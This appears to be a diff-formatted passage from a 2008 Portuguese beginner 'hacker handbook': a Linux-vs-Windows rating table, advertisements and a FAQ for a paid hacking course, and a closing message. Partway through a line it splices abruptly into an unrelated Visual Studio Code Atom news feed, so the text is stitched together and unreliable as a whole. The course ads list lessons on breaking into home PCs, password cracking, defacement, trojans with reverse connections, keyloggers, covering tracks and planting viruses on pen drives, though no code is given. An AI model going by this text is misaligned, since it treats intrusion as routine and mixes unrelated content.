+direto do CD não tem como salvar arquivos, pelo simples fato do CD já esta gravado, 
+já em um dispositivo de armazenamento pode-se tranquilamente salvar arquivos.
+www.mundodoshacker.com pagina. 84 Apostila Para Hackers Iniciantes > Linux VS Windows Profº Paulo
+ Logo que o Linux ficou mais conhecidos e cobiçado pelos usuários de 
+computadores nasceu a duvida: “Qual é melhor, o Linux ou o Windows ?”. Cada um 
+tem uma opinião igual ou diferente a do outro, mas o que não pode ser esquecido é 
+que atualmente em questão de usuários domésticos, o único que pode competir cara 
+a cara com o Windows realmente é o Linux, afinal o design do Linux é um pouco 
+parecido com o do Windows, facilitando então a vida do usuário que é acostumado 
+com o Windows. Mas não foi respondida ainda a pergunta!!!
+ Para dizermos o que é melhor do que o outro em qualquer coisa, precisamos 
+obviamente fazer uma comparação para que então haja uma resposta, é como uma 
+comparação de computadores: temos um computador Pentium Dual-Core com 512 
+megabytes de memória RAM e HD de 80 gigabytes, e do outro lado temos um 
+computador Pentium 4 com 1 gigabyte de memória RAM e HD de 160 gigabytes, qual 
+seria o melhor ? Em questão ao Linux e o Windows podemos também fazer uma 
+comparação parecida, só que ao invés de hardwares, teremos qualidades básicas 
+para um sistema operacional, como: segurança, usabilidade, softwares, design, rede, 
+etc. Uma comparação do Linux com o Windows ficaria mais ou menos da seguinte 
+forma: Obs: a cada termo será dada uma nota de 0 a 5.
+ Termos Linux Windows
+Segurança: 4.5 3.0
+Facilidade de aprendizado: 3.0 4.0
+Usabilidade: 4.0 4.0
+Softwares: 4.5 4.0
+Design: 4.5 4.5
+Rede: 5.0 4.0
+www.mundodoshacker.com pagina. 85 Apostila Para Hackers Iniciantes > Linux VS Windows Profº Paulo
+ As notas dadas acima vai depender da opinião de cada usuário, afinal ninguém 
+é igual, uns aprendem mais fácil do que os outros, essa tabela é para você ter apenas 
+uma noção de como o Linux e o Windows se saem nos termos citados.
+ Como você pode ver o Linux ganhou do Windows, somando as notas vai dar 
+25,5 pontos para o Linux e 23,5 pontos para o Windows, e realmente o resultado esta 
+certo, em uma briga Linux VS Windows quem sai ganhando é o Linux, é claro que vai 
+depender da necessidade do usuário e da tarefa que é proposta para cada um dos 
+sistemas operacionais, ou seja para cada usuário um sistema operacional se sai 
+melhor do que o outro, mas como o que esta em questão é a visão geral o resultado é 
+o já dito acima.
+ Mesmo o Linux sendo o que é hoje, ainda há um numero pequeno de usuários 
+que utilizam o mesmo, não tem nem como comparar com o numero de usuários do 
+Windows, o que acontece é que a maioria dos usuários de computadores só 
+conhecem o Windows como sistema operacional, ou não tem vontade de 
+experimentar coisas novas, o pensamento desses usuários é: “Se eu me dou também 
+com o Windows, para que eu vou querer usar o Linux?”. Bom a tendência é de 
+aumentar cada vez mais o numero de usuários do Linux, e isso vem ocorrendo de 
+uma maneira rápida, tanto que até a maioria das escolas de informática já ensinam
+pelo menos o básico sobre Linux, essa atitude é mais que certa, afinal não podemos 
+nos prender a uma só coisa, temos que aprender sempre mais e mais, caso contrario 
+não haveria a “evolução” (seja ela qual for). 
+www.mundodoshacker.com pagina. 86 Apostila Para Hackers Iniciantes > Linux é para Hackers ? Profº Paulo
+ Sim e Não!!! 
+ O Linux não é um sistema operacional exclusivo para hackers, é como o 
+Windows, ele não é para hackers mas é usado por hackers, afinal o computador de 
+um hacker tem que ter um sistema operacional seja ele qual for :D. O Linux pode ser 
+usado de diversas formas seja elas hacker ou não, exemplo: O Linux pode ser usado
+para atividades básicas de usuários domésticos como acessar a internet, fazer 
+trabalhos, imprimir arquivos, etc , e também pode ser 
+usado para atividades hacker como invasão, ataques, 
+defesa, etc. Em questão a atividades Hacker o Linux se 
+sai muito bem, chega até a se sair melhor que o
+Windows, por isso ele é tão usado e dito como sistema 
+operacional para hackers. 
+ Pelo fato do Linux ter seu código fonte aberto e se 
+adaptar muito bem a redes, ele facilita muito a vida de 
+um hacker, mas isso não significa que só com Linux que da para hackear, e nem que 
+ele seja feito para hackers, ao contrario, como já foi dito no começo desta apostila, se 
+o sistema operacional é Windows ótimo se for Linux melhor ainda, um hacker não 
+pode depender de um sistema operacional para realizar suas ações (Obs: Isso não 
+elimina a necessidade de aprender um pouco sobre Linux, pois mais dia ou menos 
+será preciso usar seu conhecimento em Linux).
+www.mundodoshacker.com pagina. 87 Apostila Para Hackers Iniciantes 2008 Profº Paulo
+www.mundodoshacker.com pagina. 88 Apostila Para Hackers Iniciantes > Produtos Mundo Dos Hackers Profº Paulo
+www.mundodoshacker.com pagina. 89 Apostila Para Hackers Iniciantes > Curso de Hacker Mundo Dos Hackers Profº Paulo
+ O Curso de Hacker Mundo Dos Hackers é composto por 3 módulos e é sem 
+dúvida um dos melhores, se não o melhor curso de hacker disponível na Internet. 
+Abaixo você pode ver as aulas que compõem os módulos do curso:
+Modulo – 1 – Começando a ser um Hacker 
+Aula 1- Escaneando seu PC
+Aula 2- Configurando corretamente seu antivírus 
+Aula 3- Senhas seguras 
+Aula 4- Navegando com segurança na Internet 
+Aula 5- O que é preciso para ser um Hacker 
+Aula 6- Hacker é segurança ou invasão 
+Aula 7- O que é um Invasor 
+Aula 8- Ética Hacker
+Aula 9- Cultura Hacker
+Aula 10- Noções de Linux
+Aula 11- Instalando e configurando o Linux
+Aula 12- Comandos Linux 
+Aula 13- Ferramentas para uma invasão 
+Aula 14- Escaneando e invadindo PCs domésticos
+Aula 15- Maquina Virtual 
+Módulo – 2 – Segurança VS Invasão 
+Aula 1- Configurando corretamente um firewall
+Aula 2- Identificando e se protegendo da Engenharia Social 
+Aula 3- Criptografia
+Aula 4- Monitorando as portas do seu computador
+Aula 5- Se protegendo de SPAM
+Aula 6- Equipamento preciso para Hackear 
+Aula 7- Quem ataca e quem defende 
+Aula 8- Engenharia Social na Pratica 
+Aula 9- Quebrando senhas 
+Aula 10- Noções básicas de rede 
+Aula 11- Invadindo sem programas específicos 
+Aula 12- Planejando uma invasão 
+Aula 13- Defacer
+Aula 14- Invadindo com trojans através de conexão reversa e keyloggers
+Aula 15- Trancando as portas vulneráveis do seu PC
+www.mundodoshacker.com pagina. 90 Apostila Para Hackers Iniciantes > Curso de Hacker Mundo Dos Hackers Profº Paulo
+Módulo – 3 – Ser Hacker já não é mais uma brincadeira 
+Aula 1- Montando e configurando uma rede segura
+Aula 2- Sintomas de invasão 
+Aula 3- Um passo na frente do invasor 
+Aula 4- Identificar e acabar com um ataque
+Aula 5- Pensando e agindo como um Hacker 
+Aula 6- Noções básicas de servidores 
+Aula 7- Montando um servidor Web 
+Aula 8- Invadindo sem deixar vestígios 
+Aula 9- Achando falhas em servidores
+Aula 10- Rastreando servidores
+Aula 11- Mente Hacker 
+Aula 12- Exploits 
+Aula 13- Invasão na pratica
+Aula 14- Portas que podem ser exploradas
+Aula 15- Usando o GCC corretamente
+Aula 16- Colocando Vírus no Pen driver
+ Como você pode ver adquirindo este curso você aprenderá bem mais do que
+noção em hacking!!! 
+ Cada módulo é um CD com as apostilas das aulas, vídeo aulas, tutoriais, 
+programas e 1 mês de suporte por MSN comigo.
+ Os alunos que se destacam no Curso de Hacker Mundo Dos Hackers passam 
+por um teste, para uma possível participação na equipe Mundo Dos Hackers.
+ O Curso custa apenas R$ 45,00 Cada módulo (R$ 45,00 mensais por 3 meses) 
+Obs: Alem de ser um excelente curso, o curso de Hacker Mundo Dos Hackers é o 
+mais barato!!!
+E mais!!!! Você só paga pelo curso depois que ele chegar em sua casa! “Isso é 
+garantia e segurança de compra!”
+ Para adquirir ou saber mais sobre o Curso acesso o site: 
+www.mundodoshacker.com
+Obs: Todo o conteúdo do curso é de exclusividade do Mundo Dos Hackers, mas o 
+mau uso do mesmo é de inteira responsabilidade do aluno que cometeu o ato ilícito.
+Todo o conteúdo do curso é legal.
+www.mundodoshacker.com pagina. 91 Apostila Para Hackers Iniciantes > Pacote Hacker Mundo Dos Hackers Profº Paulo
+ O Pacote Hacker Mundo Dos Hackers é composto por um CD com:
+mais de “250” programas hacker 
++ programas diversos 
++ apostilas 
++ vídeo aulas 
++ tutoriais 
++ livros 
++ uma semana de suporte por MSN comigo.
+ Tudo isso por apenas uma única parcela de: R$ 25,00
+ E mais!!! Você só paga pelo Pacote Hacker depois que 
+ele chegar em sua casa! “Isso é garantia e segurança de 
+compra!”
+ 
+ Para adquirir o Pacote Hacker Mundo Dos Hackers acesse agora mesmo o site: 
+www.mundodoshacker.com e faça seu pedido.
+ O Pacote Hacker Mundo Dos Hackers é o mais completo e mais barato de toda 
+a Internet!
+www.mundodoshacker.com pagina. 92 Apostila Para Hackers Iniciantes > Kit Informática Mundo Dos Hackers Profº Paulo
+ O Kit Informática é composto por um CD com:
+Mais de 150 programas para informática (segurança, 
+navegadores, codecs, conversores, etc) 
++ programas que você nunca imaginou que existiria
++ apostilas 
++ Tutoriais
++ Vídeo aulas 
++ uma semana de suporte por MSN comigo!
+ Tudo isso por apenas uma única parcela de: 
+R$ 20,00
+ E mais!!! Você só paga pelo Pacote Hacker 
+depois que ele chegar em sua casa! “Isso é garantia e 
+segurança de compra!”
+ Para adquirir o Kit Informática acesse agora mesmo o site: 
+www.mundodoshacker.com e faça seu pedido.
+www.mundodoshacker.com pagina. 93 Apostila Para Hackers Iniciantes > Camisetas Mundo Dos Hackers Profº Paulo
+ A Nova coleção das camisetas Mundo Dos Hackers estão prestes a serem 
+lançadas! São 3 modelos de camisetas com estampas na frente e atrás, todas as 
+camisetas são da cor preta e de ótima qualidade. Em breve será lançado em nosso 
+site mais detalhes sobre as camisetas e a forma de compra, mas para não deixar a 
+todos curiosos :D veja abaixo uma previa das camisetas:
+ Frente Frente
+ 
+ Frente Trás
+www.mundodoshacker.com pagina. 94 Apostila Para Hackers Iniciantes > Apostilas Impressas Mundo Dos Hackers Profº Paulo
+ Você cansou de ler apostilas na tela do seu monitor? É eu sei como que é! Alem 
+de ser chato ainda é prejudicial para aos seus olhos, o pior é quando a apostila tem 
+mais de 100 paginas :D!!! As apostilas Impressas Mundo Dos Hackers funcionam da 
+seguinte forma: todas as apostilas “incluindo essa” que estão na área de downloads 
+de apostilas no site do Mundo Dos Hackers podem ser pedidas impressas, basta você 
+escolher a apostila e fazer o pedido dela impressa, e nos enviamos ela para você com 
+capa e encadernada, a partir daí é só você ler :D!!!
+ Em breve esse produto estará oficialmente lançado, e com varias promoções!
+Qualquer dúvida entre em contato conosco pelo e-mail: 
+mundodoshackers@mundodoshackers.x-br.com
+www.mundodoshacker.com pagina. 95 Apostila Para Hackers Iniciantes > Produtos > Perguntas e Respostas Profº Paulo
+Qual a forma de envio? 
+Os produtos Mundo Dos Hackers são enviados através de carta registrada, ao ser 
+enviado o cliente pode acompanhar o andamento de seu pedido pelo site dos correios 
+ou pelo site do Mundo Dos Hackers.
+Quanto tempo demora para o pedido ser entregue?
+Demora de 3 a 5 dias úteis após o envio.
+É verdade que eu só pago depois de receber o pedido?
+Sim! Isso é para mostrar a todos que o site Mundo Dos Hackers se garante no que faz 
+e acima de tudo é honesto.
+Para quais estados os produtos Mundo Dos Hackers pode ser enviado?
+Para todos os estados do Brasil, sem exceção!
+Sou de outro país! Posso fazer pedido dos produtos Mundo Dos Hackers?
+Ai terá que haver um dialogo para que se chegue a um acordo, para isso entre em 
+contato conosco pelo e-mail: mundodoshackers@mundodoshackers.x-br.com .
+Quanto tempo leva para meu pedido ser enviado?
+Normalmente leva de 2 a 4 dias logo que confirmado o pedido.
+Minha casa não tem numero! Tem como eu receber o produto Mundo Dos Hackers?
+Sim! Basta você ir até a agencia dos correios de sua cidade e retirar o seu pedido. 
+Para isso leve com você seu RG. (Obs: Nos enviamos o endereço exato do correios 
+que o produto se encontra).
+O produto saiu para entrega mas eu não estava em minha casa! Haverá outra 
+entrega?
+Sim! São feitas até 3 tentativas de entrega, caso o cliente não se encontre em sua 
+residência em nenhuma das tentativas o produto voltara para seu local de origem.
+www.mundodoshacker.com pagina. 96 Apostila Para Hackers Iniciantes > Produtos > Perguntas e Respostas Profº Paulo
+Algum parente meu pode receber o produto?
+Sim! Desde que seu parente seja maior de idade (18 anos ou mais)
+Quais as formas de pagamento?
+Deposito bancário (Banco Caixa Econômica. O Deposito pode ser feito em uma 
+agencia do próprio banco ou em uma Casas Lotéricas. Obs: Apenas algumas Casas 
+Lotéricas conseguem fazer depósitos) e boleto bancário (Pagável em qualquer 
+agencia bancária ou Casas Lotéricas) .
+É permitido comprar mais que um produto?
+Sim! E acima de 1 produto parcelamos em até 3 vezes sem juros (Obs: Depende do 
+Produto).
+Quanto tempo eu tenho para efetuar o pagamento assim que o meu pedido é 
+entregue?
+O pagamento deve ser efetuado em até 5 dias após o recebimento do produto, caso 
+contrario deve-se entrar em contato com o Mundo Dos Hackers e dar uma data exata 
+em que o pagamento será efetuado. Obs: Os CDs do Mundo Dos Hackers vão com 
+uma senha de acesso, senha essa que será passada após o pagamento do mesmo
+Quando eu posso agendar suporte por MSN?
+Assim que o pagamento do produto for efetuado o cliente já pode fazer o pedido de 
+suporte por MSN através do nosso site: www.mundodoshacker.com . Pode ser 
+agendado suporte de segunda a sexta-feira das 13:00 as 00:00 (Obs: Eu estou aberto 
+para negociação em relação ao horário de suporte).
+Com quem é o suporte por MSN?
+Comigo mesmo, Profº Paulo
+Quanto tempo é de suporte?
+São 1 hora de suporte.
+Não pude comparecer ao suporte, posso agendar outro?
+Sim! E não haverá interferência no numero de suporte. A contagem de suporte só 
+começara a partir do dia que foi dado o primeiro suporte.
+Eu realmente aprenderei com o Curso de Hacker Mundo Dos Hackers?
+Como já foi dito o Curso de Hacker Mundo Dos Hackers é um dos melhores se não o 
+melhor Curso de Hacker da “atualidade” e de toda a “Internet”, o curso é atualizado 
+(2008) e interativo. Eu me garanto no que eu faço!!! E para ser sincero fica meio difícil 
+de um aluno não aprender, afinal todas as apostilas e vídeo aulas são de fácil 
+compreensão, e ainda tem suporte comigo para esclarecimento de dúvidas. 
+www.mundodoshacker.com pagina. 97 Apostila Para Hackers Iniciantes > Conclusão Profº Paulo
+www.mundodoshacker.com pagina. 98 Apostila Para Hackers Iniciantes 2008 Profº Paulo
+www.mundodoshacker.com pagina. 99 Apostila Para Hackers Iniciantes > Conclusão Profº Paulo
+ Não é fácil ser um Hacker, o caminho a ser percorrido não é curto e nem tem 
+fim, a cada dia, mês ou ano são lançadas novas tecnologia tanto em hacking quanto 
+em informática, cabe a você acompanhar essas evoluções e estar sempre por dentro 
+das novas tendências. Nunca se desanime ao enfrentar um grande problema, pois 
+todos problemas tem soluções, isso serve não só para hacking mas também para a 
+vida pessoal de todos. Pense da seguinte forma: “Todo hacker seja ele famoso ou não 
+começou de baixo, e foi aprendendo com os seus erros! Afinal ninguém nasce 
+sabendo e nem vira hacker da noite para o dia. Leve essa apostila como o começo de 
+um tudo, e lembre-se que mesmo sabendo muito não se sabe tudo. Os cursos 
+ajudam? Sim sem sombra de dúvida ajudam, mas cabe a você se dedicar ao máximo 
+para alcançar seus objetivos e atingir suas metas. 
+ Espero que você tenha gostado dessa apostila! E não leve a mau as 
+brincadeiras :D, não adianta fazer uma apostila ou livro com palavras difíceis que 
+ninguém entende e que quando é procurado o significado da mesma acha-se uma 
+palavra mais difícil ainda :D, para uma pessoa realmente entender e lembrar de uma 
+coisa é preciso ter uma frase, um fato ou até mesmo uma palavra que destaque e 
+chame a atenção do leitor, é ai que ta a razão das brincadeiras, pode ter certeza que 
+você vai se lembrar sempre do que é um SPAM depois de ler o trecho sobre o SPAM 
+comedia, nunca esquecera do que é um ataque DOS depois de ler sobre o Hacker 
+BIRRENTO, nunca esquecera o que é um Ransomware depois da chantagem com o 
+suco de tamarindo, e ai vai :D, são muitas coisas que pensamos e que temos que 
+gravar em nosso cérebro, se não houver um fator destaque que faça com que você 
+lembre o que significa e como é feito cada tipo de ataque pode ter certeza que o 
+mesmo será esquecido facilmente. 
+ Bom é isso ai!!! Lembrando que essa apostila é de minha total autoria e 
+totalmente gratuita. Qualquer dúvida é só entrar em contato comigo pelo e-mail: 
+paulotacio@mundodoshackers.x-br.com ou pelo telefone: (11) 7427-1943 .
+Até a próxima apostila ou livro de minha autoria :D!!!
+www.mundodoshacker.com pagina. 100 Apostila Para Hackers Iniciantes 2008 Profº Paulo
+ 
+www.mundodoshacker.com pagina. 101feed xmlns="http://www.w3.org/2005/Atom">
+<title type="text" xml:lang="en">Visual Studio Code - Code Editing. Redefined.</title>
+<link type="application/atom+xml" href="https://code.visualstudio.com/feed.xml" rel="self"/>
+<link type="text/html" href="https://code.visualstudio.com/" rel="alternate"/>
+<updated>2026-11-04T17:00:00.000Z</updated>
+<id>https://code.visualstudio.com/</id>
+<rights>Copyright (c) 2021, Microsoft, Inc.; all rights reserved.</rights>
+<entry>
+<title>Visual Studio Code 1.145 (Insiders)</title>
+<link href="https://code.visualstudio.com/updates/v1_145"/>
+<link rel="related" href="https://code.visualstudio.com/assets/updates/1_145/release-highlights.webp"/>
+<updated>2026-11-04T17:00:00.000Z</updated>
+<id>https://code.visualstudio.com/updates/v1_145</id>
+<category term="release"/>
+<content type="html"> <p>Learn what is new in Visual Studio Code 1.145 (Insiders).</p> <p><a href="https://code.visualstudio.com/updates/v1_145">Read the full article</a></p> </content>
+<author>
+<name>Visual Studio Code Team</name>
+<uri>https://code.visualstudio.com/branding/code-stable.png</uri>
+</author>
+</entry>
+<entry>
+<title>Visual Studio Code 1.144</title>
+<link href="https://code.visualstudio.com/updates/v1_144"/>
+<link rel="related" href="https://code.visualstudio.com/assets/updates/1_144/release-highlights.webp"/>
+<updated>2026-10-28T17:00:00.000Z</updated>
+<id>https://code.visualstudio.com/updates/v1_144</id>
+<category term="release"/>
+<content type="html"> <p>Learn what's new in Visual Studio Code 1.144</p> <p><a href="https://code.visualstudio.com/updates/v1_144">Read the full article</a></p> </content>
+<author>
+<name>Visual Studio Code Team</name>
+<uri>https://code.visualstudio.com/branding/code-stable.png</uri>
+</author>
+</entry>
+<entry>
+<title>VS Code Wrapped: GitHub Universe 2026</title>
+<link href="https://code.visualstudio.com/blogs/2026/10/28/vscode-wrapped"/>
+<link rel="related" href="https://code.visualstudio.com/assets/blogs/2026/10/28/social-image.png"/>
+<updated>2026-10-28T00:00:00.000Z</updated>
+<id>https://code.visualstudio.com/blogs/2026/10/28/vscode-wrapped</id>
+<category term="blog"/>
+<content type="html"> <p>Explore how VS Code evolved between GitHub Universe 2025 and 2026, with new ways to code, collaborate with agents, and manage work across tools and environments.</p> <p><a href="https://code.visualstudio.com/blogs/2026/10/28/vscode-wrapped">Read the full article</a></p> </content>
+<author>
+<name>Hailey Victory</name>
+<uri>https://code.visualstudio.com/branding/code-stable.png</uri>
+</author>
+</entry>
+<entry>
+<title>Tune GitHub Copilot Inline Suggestions with Configurable Eagerness</title>
+<link href="https://code.visualstudio.com/blogs/2026/10/27/configurable-eagerness"/>
+<link rel="related" href="https://code.visualstudio.com/assets/blogs/2026/10/27/configurable-eagerness-social.png"/>
+<updated>2026-10-26T00:00:00.000Z</updated>
+<id>https://code.visualstudio.com/blogs/2026/10/27/configurable-eagerness</id>
+<category term="blog"/>
+<content type="html"> <p>Choose how proactively Copilot offers inline suggestions.</p> <p><a href="https://code.visualstudio.com/blogs/2026/10/27/configurable-eagerness">Read the full article</a></p> </content>
+<author>
+<name>Ben Steenhoek, Ulugbek Abdullaev</name>
+<uri>https://code.visualstudio.com/branding/code-stable.png</uri>
+</author>
+</entry>
+<entry>
+<title>Visual Studio Code 1.143</title>
+<link href="https://code.visualstudio.com/updates/v1_143"/>
+<link rel="related" href="https://code.visualstudio.com/assets/updates/1_143/release-highlights.webp"/>
+<updated>2026-10-21T17:00:00.000Z</updated>
+<id>https://code.visualstudio.com/updates/v1_143</id>
+<category term="release"/>
+<content type="html"> <p>Learn what's new in Visual Studio Code 1.143</p> <p><a href="https://code.visualstudio.com/updates/v1_143">Read the full article</a></p> </content>
+<author>
+<name>Visual Studio Code Team</name>
+<uri>https://code.visualstudio.com/branding/code-stable.png</uri>
+</author>
+</entry>
+<entry>
+<title>Modernizing the VS Code UI</title>
+<link href="https://code.visualstudio.com/blogs/2026/10/15/modern-ui"/>
+<link rel="related" href="https://code.visualstudio.com/assets/blogs/2026/10/15/classic-to-modern.png"/>
+<updated>2026-10-15T00:00:00.000Z</updated>
+<id>https://code.visualstudio.com/blogs/2026/10/15/modern-ui</id>
+<category term="blog"/>
+<content type="html"> <p>See how developer feedback is shaping the modern VS Code interface, from layout density and editor tabs to themes and responsiveness.</p> <p><a href="https://code.visualstudio.com/blogs/2026/10/15/modern-ui">Read the full article</a></p> </content>
+<author>
+<name>Lee Murray</name>
+<uri>https://code.visualstudio.com/branding/code-stable.png</uri>
+</author>
+</entry>
+<entry>
+<title>Visual Studio Code 1.142</title>
+<link href="https://code.visualstudio.com/updates/v1_142"/>
+<link rel="related" href="https://code.visualstudio.com/assets/updates/1_142/release-highlights.webp"/>
+<updated>2026-10-14T17:00:00.000Z</updated>
+<id>https://code.visualstudio.com/updates/v1_142</id>
+<category term="release"/>
+<content type="html"> <p>Learn what's new in Visual Studio Code 1.142</p> <p><a href="https://code.visualstudio.com/updates/v1_142">Read the full article</a></p> </content>
+<author>
+<name>Visual Studio Code Team</name>
+<uri>https://code.visualstudio.com/branding/code-stable.png</uri>
+</author>
+</entry>
+<entry>
+<title>Visual Studio Code 1.141</title>
+<link href="https://code.visualstudio.com/updates/v1_141"/>
+<link rel="related" href="https://code.visualstudio.com/assets/updates/1_141/release-highlights.webp"/>
+<updated>2026-10-07T17:00:00.000Z</updated>
+<id>https://code.visualstudio.com/updates/v1_141</id>
+<category term="release"/>
+<content type="html"> <p>Learn what's new in Visual Studio Code 1.141</p> <p><a href="https://code.visualstudio.com/updates/v1_141">Read the full article</a></p> </content>
+<author>
+<name>Visual Studio Code Team</name>
+<uri>https://code.visualstudio.com/branding/code-stable.png</uri>
+</author>
+</entry>
+<entry>
+<title>Visual Studio Code 1.140</title>
+<link href="https://code.visualstudio.com/updates/v1_140"/>
+<link rel="related" href="https://code.visualstudio.com/assets/updates/1_140/release-highlights.webp"/>
+<updated>2026-09-30T17:00:00.000Z</updated>
+<id>https://code.visualstudio.com/updates/v1_140</id>
+<category term="release"/>
+<content type="html"> <p>Learn what's new in Visual Studio Code 1.140</p> <p><a href="https://code.visualstudio.com/updates/v1_140">Read the full article</a></p> </content>
+<author>
+<name>Visual Studio Code Team</name>
+<uri>https://code.visualstudio.com/branding/code-stable.png</uri>
+</author>
+</entry>
+<entry>
+<title>Visual Studio Code 1.139</title>
+<link href="https://code.visualstudio.com/updates/v1_139"/>
+<link rel="related" href="https://code.visualstudio.com/assets/updates/1_139/release-highlights.webp"/>
+<updated>2026-09-23T17:00:00.000Z</updated>
+<id>https://code.visualstudio.com/updates/v1_139</id>
+<category term="release"/>
+<content type="html"> <p>Learn what is new in Visual Studio Code 1.139</p> <p><a href="https://code.visualstudio.com/updates/v1_139">Read the full article</a></p> </content>
+<author>
+<name>Visual Studio Code Team</name>
+<uri>https://code.visualstudio.com/branding/code-stable.png</uri>
+</author>
+</entry>
+<entry>
+<title>Building the new GitHub Copilot Inline Suggestions Model: Part Two</title>
+<link href="https://code.visualstudio.com/blogs/2026/09/23/building-the-github-copilot-inline-suggestions-model-part-two"/>
+<link rel="related" href="https://code.visualstudio.com/assets/blogs/2026/09/23/building_github_copilot_inline_suggestions.png"/>
+<updated>2026-09-23T00:00:00.000Z</updated>
+<id>https://code.visualstudio.com/blogs/2026/09/23/building-the-github-copilot-inline-suggestions-model-part-two</id>
+<category term="blog"/>
+<content type="html"> <p>See how GitHub Copilot added completions to its unified inline suggestions model, refined ghost text and editor behavior, and improved user satisfaction.</p> <p><a href="https://code.visualstudio.com/blogs/2026/09/23/building-the-github-copilot-inline-suggestions-model-part-two">Read the full article</a></p> </content>
+<author>
+<name>Julia Gong, Shengjie Ma, Ben Liggett, Ulugbek Abdullaev</name>
+<uri>https://code.visualstudio.com/branding/code-stable.png</uri>
+</author>
+</entry>
+<entry>
+<title>Visual Studio Code 1.138</title>
+<link href="https://code.visualstudio.com/updates/v1_138"/>
+<link rel="related" href="https://code.visualstudio.com/assets/updates/1_138/release-highlights.webp"/>
+<updated>2026-09-16T17:00:00.000Z</updated>
+<id>https://code.visualstudio.com/updates/v1_138</id>
+<category term="release"/>
+<content type="html"> <p>Learn what is new in Visual Studio Code 1.138</p> <p><a href="https://code.visualstudio.com/updates/v1_138">Read the full article</a></p> </content>
+<author>
+<name>Visual Studio Code Team</name>
+<uri>https://code.visualstudio.com/branding/code-stable.png</uri>
+</author>
+</entry>
+<entry>
+<title>Building the new GitHub Copilot Inline Suggestions Model: Part One</title>
+<link href="https://code.visualstudio.com/blogs/2026/09/16/building-the-github-copilot-inline-suggestions-model-part-one"/>
+<link rel="related" href="https://code.visualstudio.com/assets/blogs/2026/09/16/building_github_copilot_inline_suggestions.png"/>
+<updated>2026-09-16T00:00:00.000Z</updated>
+<id>https://code.visualstudio.com/blogs/2026/09/16/building-the-github-copilot-inline-suggestions-model-part-one</id>
+<category term="blog"/>
+<content type="html"> <p>Explore how GitHub Copilot unified completion, next edit, and long-distance suggestions into one model for a faster, more cohesive coding experience.</p> <p><a href="https://code.visualstudio.com/blogs/2026/09/16/building-the-github-copilot-inline-suggestions-model-part-one">Read the full article</a></p> </content>
+<author>
+<name>Julia Gong, Ben Liggett, Ulugbek Abdullaev</name>
+<uri>https://code.visualstudio.com/branding/code-stable.png</uri>
+</author>
+</entry>
+<entry>
+<title>Visual Studio Code 1.137</title>
+<link href="https://code.visualstudio.com/updates/v1_137"/>
+<link rel="related" href="https://code.visualstudio.com/assets/updates/1_137/release-highlights.webp"/>
+<updated>2026-09-09T17:00:00.000Z</updated>
+<id>https://code.visualstudio.com/updates/v1_137</id>
+<category term="release"/>
+<content type="html"> <p>Learn what's new in Visual Studio Code 1.137</p> <p><a href="https://code.visualstudio.com/updates/v1_137">Read the full article</a></p> </content>
+<author>
+<name>Visual Studio Code Team</name>
+<uri>https://code.visualstudio.com/branding/code-stable.png</uri>
+</author>
+</entry>
+<entry>
+<title>Visual Studio Code 1.136</title>
+<link href="https://code.visualstudio.com/updates/v1_136"/>
+<link rel="related" href="https://code.visualstudio.com/assets/updates/1_136/release-highlights.webp"/>
+<updated>2026-09-02T17:00:00.000Z</updated>
+<id>https://code.visualstudio.com/updates/v1_136</id>
+<category term="release"/>
+<content type="html"> <p>Learn what is new in Visual Studio Code 1.136</p> <p><a href="https://code.visualstudio.com/updates/v1_136">Read the full article</a></p> </content>
+<author>
+<name>Visual Studio Code Team</name>
+<uri>https://code.visualstudio.com/branding/code-stable.png</uri>
+</author>
+</entry>
+<entry>
+<title>Visual Studio Code 1.135</title>
+<link href="https://code.visualstudio.com/updates/v1_135"/>
+<link rel="related" href="https://code.visualstudio.com/assets/updates/1_135/release-highlights.webp"/>
+<updated>2026-08-26T17:00:00.000Z</updated>
+<id>https://code.visualstudio.com/updates/v1_135</id>
+<category term="release"/>
+<content type="html"> <p>Learn what's new in Visual Studio Code 1.135</p> <p><a href="https://code.visualstudio.com/updates/v1_135">Read the full article</a></p> </content>
+<author>
+<name>Visual Studio Code Team</name>
+<uri>https://code.visualstudio.com/branding/code-stable.png</uri>
+</author>
+</entry>
+<entry>
+<title>Introducing the Agent Host for persistent, portable agent sessions</title>
+<link href="https://code.visualstudio.com/blogs/2026/08/26/agent-host-architecture"/>
+<link rel="related" href="https://code.visualstudio.com/assets/blogs/2026/08/26/remote-agent-hosts.webp"/>
+<updated>2026-08-26T00:00:00.000Z</updated>
+<id>https://code.visualstudio.com/blogs/2026/08/26/agent-host-architecture</id>
+<category term="blog"/>
+<content type="html"> <p>Explore how the VS Code Agent Host and AHP support multiple agent harnesses with durable, synchronized local and remote sessions.</p> <p><a href="https://code.visualstudio.com/blogs/2026/08/26/agent-host-architecture">Read the full article</a></p> </content>
+<author>
+<name>Rob Lourens, Connor Peet, Brigit Murtaugh</name>
+<uri>https://code.visualstudio.com/branding/code-stable.png</uri>
+</author>
+</entry>
+<entry>
+<title>Visual Studio Code 1.134</title>
+<link href="https://code.visualstudio.com/updates/v1_134"/>
+<link rel="related" href="https://code.visualstudio.com/assets/updates/1_134/release-highlights.webp"/>
+<updated>2026-08-19T17:00:00.000Z</updated>
+<id>https://code.visualstudio.com/updates/v1_134</id>
+<category term="release"/>
+<content type="html"> <p>Learn what's new in Visual Studio Code 1.134</p> <p><a href="https://code.visualstudio.com/updates/v1_134">Read the full article</a></p> </content>
+<author>
+<name>Visual Studio Code Team</name>
+<uri>https://code.visualstudio.com/branding/code-stable.png</uri>
+</author>
+</entry>
+<entry>
+<title>Visual Studio Code 1.133</title>
+<link href="https://code.visualstudio.com/updates/v1_133"/>
+<link rel="related" href="https://code.visualstudio.com/assets/updates/1_133/release-highlights.webp"/>
+<updated>2026-08-12T17:00:00.000Z</updated>
+<id>https://code.visualstudio.com/updates/v1_133</id>
+<category term="release"/>
+<content type="html"> <p>Learn what's new in Visual Studio Code 1.133</p> <p><a href="https://code.visualstudio.com/updates/v1_133">Read the full article</a></p> </content>
+<author>
+<name>Visual Studio Code Team</name>
+<uri>https://code.visualstudio.com/branding/code-stable.png</uri>
+</author>
+</entry>
+<entry>
+<title>Visual Studio Code 1.132</title>
+<link href="https://code.visualstudio.com/updates/v1_132"/>
+<link rel="related" href="https://code.visualstudio.com/assets/updates/1_132/release-highlights.webp"/>
+<updated>2026-08-05T17:00:00.000Z</updated>
+<id>https://code.visualstudio.com/updates/v1_132</id>
+<category term="release"/>
+<content type="html"> <p>Learn what's new in Visual Studio Code 1.132</p> <p><a href="https://code.visualstudio.com/updates/v1_132">Read the full article</a></p> </content>
+<author>
+<name>Visual Studio Code Team</name>
+<uri>https://code.visualstudio.com/branding/code-stable.png</uri>
